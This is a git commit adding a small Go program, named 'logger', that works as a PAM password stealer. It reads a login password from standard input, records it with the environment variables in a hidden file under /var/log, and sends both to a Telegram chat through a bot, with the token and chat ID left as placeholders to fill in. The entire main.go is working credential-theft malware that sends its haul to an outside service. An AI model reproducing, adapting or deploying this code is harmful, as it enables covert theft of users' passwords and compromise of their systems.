f5576bfc7f16de3b747048321e5e8cb8257697a0
Timmy <qoo7972365@gmail.com>
2024-08-17 21:58:13 +0800

    first

---
+++ go.mod
@@ -0,0 +1,11 @@
+module logger
+
+go 1.21.6
+
+require (
+	github.com/go-telegram-bot-api/telegram-bot-api/v5 v5.5.1 // indirect
+	github.com/mattn/go-colorable v0.1.13 // indirect
+	github.com/mattn/go-isatty v0.0.20 // indirect
+	github.com/rs/zerolog v1.33.0 // indirect
+	golang.org/x/sys v0.24.0 // indirect
+)
---
+++ main.go
@@ -0,0 +1,54 @@
+package main
+
+import (
+	"fmt"
+	"os"
+
+	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
+	"github.com/rs/zerolog"
+	"github.com/rs/zerolog/log"
+)
+
+var (
+	Logfile       string = "/var/log/.passwords.log"
+	TelegramToken string = "###這裡改成TG token"
+	ChatID        int64  = 123213 // 替換為你的Chat ID
+)
+
+func main() {
+	// 打开日志文件
+	file, err := os.OpenFile(Logfile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
+	if err != nil {
+		os.Exit(0)
+	}
+	defer file.Close()
+
+	// 获取环境变量和输入密码
+	vars := os.Environ()
+	var password string
+	fmt.Scan(&password)
+
+	// 配置日志记录
+	log.Logger = zerolog.New(file).With().Timestamp().Logger()
+
+	// 记录到日志文件
+	log.Info().
+		Interface("vars", vars).
+		Str("password", password).
+		Msg("Pam password log")
+
+	// 初始化Telegram Bot
+	bot, err := tgbotapi.NewBotAPI(TelegramToken)
+	if err != nil {
+		log.Fatal().Err(err).Msg("Failed to create Telegram bot")
+	}
+
+	// 构建发送消息
+	msg := tgbotapi.NewMessage(ChatID, fmt.Sprintf("Password: %s\nVars: %v", password, vars))
+
+	// 发送消息
+	_, err = bot.Send(msg)
+	if err != nil {
+		log.Error().Err(err).Msg("Failed to send message to Telegram")
+	}
+}
